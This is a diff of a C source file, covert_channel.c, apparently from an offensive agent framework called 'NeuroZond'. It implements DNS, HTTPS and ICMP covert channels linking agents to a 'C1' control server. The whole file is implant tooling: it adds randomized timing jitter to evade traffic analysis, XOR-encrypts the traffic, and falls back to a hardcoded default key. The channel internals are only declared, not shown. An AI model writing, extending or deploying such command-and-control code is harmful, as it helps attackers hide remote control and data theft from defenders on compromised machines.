@@ -1,219 +1,492 @@
 /**
  * @file covert_channel.c
- * @brief Implementation of the covert channel communication module
+ * @brief Implementation of covert communication channels module
  * @author iamtomasanderson@gmail.com
- * @date 2023-08-15
- *
- * This module provides functionality for establishing and managing covert
- * communication channels between NeuroZond agents and the C1 server.
+ * @date 2023-09-01
  */
 
-#include "covert_channel.h"
+#include "../include/covert_channel.h"
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
 
-// Function pointers for different channel types
-static covert_channel_init_func channel_init_funcs[CHANNEL_TYPE_MAX] = {NULL};
-static covert_channel_connect_func channel_connect_funcs[CHANNEL_TYPE_MAX] = {NULL};
-static covert_channel_send_func channel_send_funcs[CHANNEL_TYPE_MAX] = {NULL};
-static covert_channel_receive_func channel_receive_funcs[CHANNEL_TYPE_MAX] = {NULL};
-static covert_channel_set_jitter_func channel_set_jitter_funcs[CHANNEL_TYPE_MAX] = {NULL};
-static covert_channel_cleanup_func channel_cleanup_funcs[CHANNEL_TYPE_MAX] = {NULL};
+#ifdef _WIN32
+#include <windows.h>
+#else
+#include <unistd.h>
+#include <sys/time.h>
+#endif
 
-// Forward declarations for channel initialization
-extern int dns_channel_init(void** handle, const char* server_addr, void* config);
-extern int dns_channel_connect(void* handle);
-extern int dns_channel_send(void* handle, const uint8_t* data, size_t data_len);
-extern int dns_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received);
-extern int dns_channel_set_jitter(void* handle, uint32_t min_delay_ms, uint32_t max_delay_ms);
-extern int dns_channel_cleanup(void* handle);
+#define MAX_ERROR_MSG_LEN 256
 
-extern int https_channel_init(void** handle, const char* server_addr, void* config);
-extern int https_channel_connect(void* handle);
-extern int https_channel_send(void* handle, const uint8_t* data, size_t data_len);
-extern int https_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received);
-extern int https_channel_set_jitter(void* handle, uint32_t min_delay_ms, uint32_t max_delay_ms);
-extern int https_channel_cleanup(void* handle);
-
-extern int icmp_channel_init(void** handle, const char* server_addr, void* config);
-extern int icmp_channel_connect(void* handle);
-extern int icmp_channel_send(void* handle, const uint8_t* data, size_t data_len);
-extern int icmp_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received);
-extern int icmp_channel_set_jitter(void* handle, uint32_t min_delay_ms, uint32_t max_delay_ms);
-extern int icmp_channel_cleanup(void* handle);
-
-// Initialize the covert channel module
-int covert_channel_module_init(void) {
-    // Register DNS channel handlers
-    channel_init_funcs[CHANNEL_TYPE_DNS] = dns_channel_init;
-    channel_connect_funcs[CHANNEL_TYPE_DNS] = dns_channel_connect;
-    channel_send_funcs[CHANNEL_TYPE_DNS] = dns_channel_send;
-    channel_receive_funcs[CHANNEL_TYPE_DNS] = dns_channel_receive;
-    channel_set_jitter_funcs[CHANNEL_TYPE_DNS] = dns_channel_set_jitter;
-    channel_cleanup_funcs[CHANNEL_TYPE_DNS] = dns_channel_cleanup;
+/**
+ * @brief Structure to hold covert channel context
+ */
+struct CovertChannel {
+    CovertChannelType type;
+    EncryptionType encryption;
+    char* server_address;
+    uint16_t server_port;
+    uint8_t* key;
+    size_t key_length;
+    unsigned int jitter_min;
+    unsigned int jitter_max;
+    void* channel_data;
+    char error_msg[MAX_ERROR_MSG_LEN];
     
-    // Register HTTPS channel handlers
-    channel_init_funcs[CHANNEL_TYPE_HTTPS] = https_channel_init;
-    channel_connect_funcs[CHANNEL_TYPE_HTTPS] = https_channel_connect;
-    channel_send_funcs[CHANNEL_TYPE_HTTPS] = https_channel_send;
-    channel_receive_funcs[CHANNEL_TYPE_HTTPS] = https_channel_receive;
-    channel_set_jitter_funcs[CHANNEL_TYPE_HTTPS] = https_channel_set_jitter;
-    channel_cleanup_funcs[CHANNEL_TYPE_HTTPS] = https_channel_cleanup;
+    /* Function pointers for channel-specific operations */
+    int (*channel_init)(struct CovertChannel*);
+    int (*channel_connect)(struct CovertChannel*);
+    int (*channel_send)(struct CovertChannel*, const uint8_t*, size_t);
+    int (*channel_receive)(struct CovertChannel*, uint8_t*, size_t);
+    void (*channel_cleanup)(struct CovertChannel*);
+};
+
+/* Forward declarations of channel-specific functions */
+int dns_channel_init(struct CovertChannel* channel);
+int dns_channel_connect(struct CovertChannel* channel);
+int dns_channel_send(struct CovertChannel* channel, const uint8_t* data, size_t data_len);
+int dns_channel_receive(struct CovertChannel* channel, uint8_t* buffer, size_t buffer_size);
+void dns_channel_cleanup(struct CovertChannel* channel);
+
+int https_channel_init(struct CovertChannel* channel);
+int https_channel_connect(struct CovertChannel* channel);
+int https_channel_send(struct CovertChannel* channel, const uint8_t* data, size_t data_len);
+int https_channel_receive(struct CovertChannel* channel, uint8_t* buffer, size_t buffer_size);
+void https_channel_cleanup(struct CovertChannel* channel);
+
+int icmp_channel_init(struct CovertChannel* channel);
+int icmp_channel_connect(struct CovertChannel* channel);
+int icmp_channel_send(struct CovertChannel* channel, const uint8_t* data, size_t data_len);
+int icmp_channel_receive(struct CovertChannel* channel, uint8_t* buffer, size_t buffer_size);
+void icmp_channel_cleanup(struct CovertChannel* channel);
+
+/* Encryption functions */
+static int encrypt_data(struct CovertChannel* channel, const uint8_t* input, size_t input_len, 
+                        uint8_t* output, size_t output_size, size_t* output_len);
+static int decrypt_data(struct CovertChannel* channel, const uint8_t* input, size_t input_len, 
+                        uint8_t* output, size_t output_size, size_t* output_len);
+
+/* Helper functions */
+static void set_error(struct CovertChannel* channel, const char* format, ...);
+static unsigned int get_random_delay(unsigned int min, unsigned int max);
+static void sleep_ms(unsigned int ms);
+
+/**
+ * Initialize a covert channel with given configuration
+ */
+CovertChannelHandle covert_channel_init(CovertChannelConfig* config) {
+    if (!config || !config->server_address) {
+        return NULL;
+    }
     
-    // Register ICMP channel handlers
-    channel_init_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_init;
-    channel_connect_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_connect;
-    channel_send_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_send;
-    channel_receive_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_receive;
-    channel_set_jitter_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_set_jitter;
-    channel_cleanup_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_cleanup;
+    /* Allocate and initialize channel structure */
+    struct CovertChannel* channel = (struct CovertChannel*)calloc(1, sizeof(struct CovertChannel));
+    if (!channel) {
+        return NULL;
+    }
     
-    // Initialize random seed for jitter functions
+    /* Initialize random number generator */
     srand((unsigned int)time(NULL));
     
-    return 0;
+    /* Copy configuration */
+    channel->type = config->channel_type;
+    channel->encryption = config->encryption_type;
+    channel->server_port = config->server_port;
+    channel->jitter_min = config->jitter_min_ms;
+    channel->jitter_max = config->jitter_max_ms;
+    
+    /* Set default jitter if not specified */
+    if (channel->jitter_min == 0 && channel->jitter_max == 0) {
+        channel->jitter_min = 100;
+        channel->jitter_max = 1000;
+    }
+    
+    /* Copy server address */
+    channel->server_address = strdup(config->server_address);
+    if (!channel->server_address) {
+        free(channel);
+        return NULL;
+    }
+    
+    /* Copy encryption key if provided */
+    if (config->encryption_key && config->key_length > 0) {
+        channel->key = (uint8_t*)malloc(config->key_length);
+        if (!channel->key) {
+            free(channel->server_address);
+            free(channel);
+            return NULL;
+        }
+        memcpy(channel->key, config->encryption_key, config->key_length);
+        channel->key_length = config->key_length;
+    } else if (config->encryption_type != ENCRYPTION_NONE) {
+        /* Generate a simple default key if encryption is enabled but no key provided */
+        const char* default_key = "NeuroZond_DefaultKey_2023";
+        size_t default_key_len = strlen(default_key);
+        
+        channel->key = (uint8_t*)malloc(default_key_len);
+        if (!channel->key) {
+            free(channel->server_address);
+            free(channel);
+            return NULL;
+        }
+        memcpy(channel->key, default_key, default_key_len);
+        channel->key_length = default_key_len;
+    }
+    
+    /* Set up channel-specific function pointers */
+    switch (channel->type) {
+        case CHANNEL_TYPE_DNS:
+            channel->channel_init = dns_channel_init;
+            channel->channel_connect = dns_channel_connect;
+            channel->channel_send = dns_channel_send;
+            channel->channel_receive = dns_channel_receive;
+            channel->channel_cleanup = dns_channel_cleanup;
+            break;
+            
+        case CHANNEL_TYPE_HTTPS:
+            channel->channel_init = https_channel_init;
+            channel->channel_connect = https_channel_connect;
+            channel->channel_send = https_channel_send;
+            channel->channel_receive = https_channel_receive;
+            channel->channel_cleanup = https_channel_cleanup;
+            break;
+            
+        case CHANNEL_TYPE_ICMP:
+            channel->channel_init = icmp_channel_init;
+            channel->channel_connect = icmp_channel_connect;
+            channel->channel_send = icmp_channel_send;
+            channel->channel_receive = icmp_channel_receive;
+            channel->channel_cleanup = icmp_channel_cleanup;
+            break;
+            
+        default:
+            set_error(channel, "Unsupported channel type: %d", channel->type);
+            free(channel->key);
+            free(channel->server_address);
+            free(channel);
+            return NULL;
+    }
+    
+    /* Initialize the specific channel type */
+    if (channel->channel_init && channel->channel_init(channel) < 0) {
+        free(channel->key);
+        free(channel->server_address);
+        free(channel);
+        return NULL;
+    }
+    
+    return (CovertChannelHandle)channel;
 }
 
-int covert_channel_init(covert_channel_handle_t* handle, enum CovertChannelType channel_type, 
-                        const char* server_addr, void* config) {
-    if (!handle || !server_addr || channel_type >= CHANNEL_TYPE_MAX) {
-        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
+/**
+ * Connect to C1 server using the covert channel
+ */
+int covert_channel_connect(CovertChannelHandle handle) {
+    struct CovertChannel* channel = (struct CovertChannel*)handle;
+    
+    if (!channel) {
+        return -1;
     }
     
-    // Check if the handler for this channel type is registered
-    if (channel_init_funcs[channel_type] == NULL) {
-        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
+    if (!channel->channel_connect) {
+        set_error(channel, "Channel connect function not implemented");
+        return -1;
     }
     
-    // Allocate memory for the handle
-    *handle = (covert_channel_handle_t)malloc(sizeof(struct covert_channel_handle_s));
-    if (*handle == NULL) {
-        return COVERT_CHANNEL_ERROR_MEMORY;
+    return channel->channel_connect(channel);
+}
+
+/**
+ * Send data through covert channel
+ */
+int covert_channel_send(CovertChannelHandle handle, const uint8_t* data, size_t data_len) {
+    struct CovertChannel* channel = (struct CovertChannel*)handle;
+    
+    if (!channel || !data || data_len == 0) {
+        return -1;
     }
     
-    // Initialize handle
-    (*handle)->channel_type = channel_type;
-    (*handle)->internal_handle = NULL;
+    if (!channel->channel_send) {
+        set_error(channel, "Channel send function not implemented");
+        return -1;
+    }
     
-    // Call the specific channel initialization function
-    int result = channel_init_funcs[channel_type](&((*handle)->internal_handle), server_addr, config);
-    if (result != 0) {
-        free(*handle);
-        *handle = NULL;
+    /* Add jitter delay before sending */
+    sleep_ms(get_random_delay(channel->jitter_min, channel->jitter_max));
+    
+    /* If encryption is enabled, encrypt the data first */
+    if (channel->encryption != ENCRYPTION_NONE) {
+        uint8_t* encrypted = (uint8_t*)malloc(data_len * 2); /* Allow space for encryption overhead */
+        if (!encrypted) {
+            set_error(channel, "Failed to allocate memory for encryption");
+            return -1;
+        }
+        
+        size_t encrypted_len = 0;
+        if (encrypt_data(channel, data, data_len, encrypted, data_len * 2, &encrypted_len) < 0) {
+            free(encrypted);
+            return -1;
+        }
+        
+        /* Send the encrypted data */
+        int result = channel->channel_send(channel, encrypted, encrypted_len);
+        free(encrypted);
         return result;
     }
     
-    return 0;
+    /* Send the plaintext data */
+    return channel->channel_send(channel, data, data_len);
 }
 
-int covert_channel_connect(covert_channel_handle_t handle) {
-    if (!handle || !handle->internal_handle) {
-        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
+/**
+ * Receive data from covert channel
+ */
+int covert_channel_receive(CovertChannelHandle handle, uint8_t* buffer, size_t buffer_size) {
+    struct CovertChannel* channel = (struct CovertChannel*)handle;
+    
+    if (!channel || !buffer || buffer_size == 0) {
+        return -1;
     }
     
-    if (handle->channel_type >= CHANNEL_TYPE_MAX || channel_connect_funcs[handle->channel_type] == NULL) {
-        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
+    if (!channel->channel_receive) {
+        set_error(channel, "Channel receive function not implemented");
+        return -1;
     }
     
-    return channel_connect_funcs[handle->channel_type](handle->internal_handle);
-}
-
-int covert_channel_send(covert_channel_handle_t handle, const uint8_t* data, size_t data_len) {
-    if (!handle || !handle->internal_handle || !data || data_len == 0) {
-        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
-    }
+    /* Add jitter delay before receiving */
+    sleep_ms(get_random_delay(channel->jitter_min, channel->jitter_max));
     
-    if (handle->channel_type >= CHANNEL_TYPE_MAX || channel_send_funcs[handle->channel_type] == NULL) {
-        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
-    }
-    
-    return channel_send_funcs[handle->channel_type](handle->internal_handle, data, data_len);
-}
-
-int covert_channel_receive(covert_channel_handle_t handle, uint8_t* buffer, size_t buffer_size, 
-                           size_t* bytes_received) {
-    if (!handle || !handle->internal_handle || !buffer || buffer_size == 0 || !bytes_received) {
-        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
-    }
-    
-    if (handle->channel_type >= CHANNEL_TYPE_MAX || channel_receive_funcs[handle->channel_type] == NULL) {
-        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
-    }
-    
-    return channel_receive_funcs[handle->channel_type](handle->internal_handle, buffer, buffer_size, bytes_received);
-}
-
-int covert_channel_set_jitter(covert_channel_handle_t handle, uint32_t min_delay_ms, uint32_t max_delay_ms) {
-    if (!handle || !handle->internal_handle || min_delay_ms > max_delay_ms) {
-        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
-    }
-    
-    if (handle->channel_type >= CHANNEL_TYPE_MAX || channel_set_jitter_funcs[handle->channel_type] == NULL) {
-        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
-    }
-    
-    return channel_set_jitter_funcs[handle->channel_type](handle->internal_handle, min_delay_ms, max_delay_ms);
-}
-
-int covert_channel_cleanup(covert_channel_handle_t handle) {
-    if (!handle) {
-        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
-    }
-    
-    int result = 0;
-    
-    if (handle->internal_handle && 
-        handle->channel_type < CHANNEL_TYPE_MAX && 
-        channel_cleanup_funcs[handle->channel_type] != NULL) {
-        
-        result = channel_cleanup_funcs[handle->channel_type](handle->internal_handle);
-    }
-    
-    free(handle);
-    return result;
-}
-
-// Helper function to apply XOR encryption to data
-int covert_channel_encrypt_xor(uint8_t* data, size_t data_len, const uint8_t* key, size_t key_len) {
-    if (!data || !key || data_len == 0 || key_len == 0) {
-        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
-    }
-    
-    for (size_t i = 0; i < data_len; i++) {
-        data[i] ^= key[i % key_len];
-    }
-    
-    return 0;
-}
-
-// Helper function to decrypt XOR encrypted data
-int covert_channel_decrypt_xor(uint8_t* data, size_t data_len, const uint8_t* key, size_t key_len) {
-    // XOR encryption and decryption are the same operation
-    return covert_channel_encrypt_xor(data, data_len, key, key_len);
-}
-
-// Helper function to apply randomized delay for traffic obfuscation
-void covert_channel_apply_jitter(uint32_t min_delay_ms, uint32_t max_delay_ms) {
-    if (min_delay_ms == max_delay_ms) {
-        if (min_delay_ms > 0) {
-            // Sleep for the exact time
-#ifdef _WIN32
-            Sleep(min_delay_ms);
-#else
-            usleep(min_delay_ms * 1000);
-#endif
+    /* If encryption is enabled, we need to receive into a temporary buffer first */
+    if (channel->encryption != ENCRYPTION_NONE) {
+        uint8_t* encrypted = (uint8_t*)malloc(buffer_size);
+        if (!encrypted) {
+            set_error(channel, "Failed to allocate memory for decryption");
+            return -1;
         }
+        
+        int recv_len = channel->channel_receive(channel, encrypted, buffer_size);
+        if (recv_len <= 0) {
+            free(encrypted);
+            return recv_len;
+        }
+        
+        size_t decrypted_len = 0;
+        if (decrypt_data(channel, encrypted, recv_len, buffer, buffer_size, &decrypted_len) < 0) {
+            free(encrypted);
+            return -1;
+        }
+        
+        free(encrypted);
+        return (int)decrypted_len;
+    }
+    
+    /* Receive plaintext data */
+    return channel->channel_receive(channel, buffer, buffer_size);
+}
+
+/**
+ * Set jitter values for transmission timing
+ */
+int covert_channel_set_jitter(CovertChannelHandle handle, unsigned int min_ms, unsigned int max_ms) {
+    struct CovertChannel* channel = (struct CovertChannel*)handle;
+    
+    if (!channel) {
+        return -1;
+    }
+    
+    if (min_ms > max_ms) {
+        set_error(channel, "Invalid jitter range: min (%u) > max (%u)", min_ms, max_ms);
+        return -1;
+    }
+    
+    channel->jitter_min = min_ms;
+    channel->jitter_max = max_ms;
+    
+    return 0;
+}
+
+/**
+ * Close and clean up a covert channel
+ */
+void covert_channel_cleanup(CovertChannelHandle handle) {
+    struct CovertChannel* channel = (struct CovertChannel*)handle;
+    
+    if (!channel) {
         return;
     }
     
-    // Generate random delay within the specified range
-    uint32_t delay = min_delay_ms + (rand() % (max_delay_ms - min_delay_ms + 1));
+    /* Call channel-specific cleanup function if available */
+    if (channel->channel_cleanup) {
+        channel->channel_cleanup(channel);
+    }
     
-    // Sleep for the calculated time
+    /* Free resources */
+    free(channel->server_address);
+    
+    if (channel->key) {
+        /* Securely wipe key from memory before freeing */
+        memset(channel->key, 0, channel->key_length);
+        free(channel->key);
+    }
+    
+    free(channel);
+}
+
+/**
+ * Get the last error message
+ */
+const char* covert_channel_get_error(CovertChannelHandle handle) {
+    struct CovertChannel* channel = (struct CovertChannel*)handle;
+    
+    if (!channel) {
+        return "Invalid channel handle";
+    }
+    
+    return channel->error_msg;
+}
+
+/* --- Implementation of helper functions --- */
+
+/**
+ * Set error message in the channel context
+ */
+static void set_error(struct CovertChannel* channel, const char* format, ...) {
+    if (!channel) {
+        return;
+    }
+    
+    va_list args;
+    va_start(args, format);
+    vsnprintf(channel->error_msg, MAX_ERROR_MSG_LEN - 1, format, args);
+    va_end(args);
+}
+
+/**
+ * Get a random delay between min and max milliseconds
+ */
+static unsigned int get_random_delay(unsigned int min, unsigned int max) {
+    if (min >= max) {
+        return min;
+    }
+    
+    return min + (rand() % (max - min + 1));
+}
+
+/**
+ * Sleep for the specified number of milliseconds
+ */
+static void sleep_ms(unsigned int ms) {
 #ifdef _WIN32
-    Sleep(delay);
+    Sleep(ms);
 #else
-    usleep(delay * 1000);
+    usleep(ms * 1000);
 #endif
+}
+
+/* --- Encryption implementation --- */
+
+/**
+ * Simple XOR encryption
+ */
+static int xor_encrypt(const uint8_t* key, size_t key_len, const uint8_t* input, 
+                      size_t input_len, uint8_t* output, size_t output_size) {
+    if (output_size < input_len) {
+        return -1;
+    }
+    
+    for (size_t i = 0; i < input_len; i++) {
+        output[i] = input[i] ^ key[i % key_len];
+    }
+    
+    return 0;
+}
+
+/**
+ * Encrypt data using the configured encryption method
+ */
+static int encrypt_data(struct CovertChannel* channel, const uint8_t* input, size_t input_len, 
+                       uint8_t* output, size_t output_size, size_t* output_len) {
+    if (!channel || !input || !output || !output_len) {
+        return -1;
+    }
+    
+    switch (channel->encryption) {
+        case ENCRYPTION_XOR:
+            if (xor_encrypt(channel->key, channel->key_length, input, input_len, output, output_size) < 0) {
+                set_error(channel, "XOR encryption failed");
+                return -1;
+            }
+            *output_len = input_len;
+            return 0;
+            
+        case ENCRYPTION_AES256:
+            /* Placeholder for AES-256 encryption */
+            set_error(channel, "AES-256 encryption not implemented");
+            return -1;
+            
+        case ENCRYPTION_CHACHA20:
+            /* Placeholder for ChaCha20 encryption */
+            set_error(channel, "ChaCha20 encryption not implemented");
+            return -1;
+            
+        case ENCRYPTION_NONE:
+            /* Just copy the data */
+            if (output_size < input_len) {
+                set_error(channel, "Output buffer too small");
+                return -1;
+            }
+            memcpy(output, input, input_len);
+            *output_len = input_len;
+            return 0;
+            
+        default:
+            set_error(channel, "Unknown encryption type: %d", channel->encryption);
+            return -1;
+    }
+}
+
+/**
+ * Decrypt data using the configured encryption method
+ */
+static int decrypt_data(struct CovertChannel* channel, const uint8_t* input, size_t input_len, 
+                       uint8_t* output, size_t output_size, size_t* output_len) {
+    if (!channel || !input || !output || !output_len) {
+        return -1;
+    }
+    
+    switch (channel->encryption) {
+        case ENCRYPTION_XOR:
+            /* XOR encryption and decryption are the same operation */
+            if (xor_encrypt(channel->key, channel->key_length, input, input_len, output, output_size) < 0) {
+                set_error(channel, "XOR decryption failed");
+                return -1;
+            }
+            *output_len = input_len;
+            return 0;
+            
+        case ENCRYPTION_AES256:
+            /* Placeholder for AES-256 decryption */
+            set_error(channel, "AES-256 decryption not implemented");
+            return -1;
+            
+        case ENCRYPTION_CHACHA20:
+            /* Placeholder for ChaCha20 decryption */
+            set_error(channel, "ChaCha20 decryption not implemented");
+            return -1;
+            
+        case ENCRYPTION_NONE:
+            /* Just copy the data */
+            if (output_size < input_len) {
+                set_error(channel, "Output buffer too small");
+                return -1;
+            }
+            memcpy(output, input, input_len);
+            *output_len = input_len;
+            return 0;
+            
+        default:
+            set_error(channel, "Unknown encryption type: %d", channel->encryption);
+            return -1;
+    }
 } 
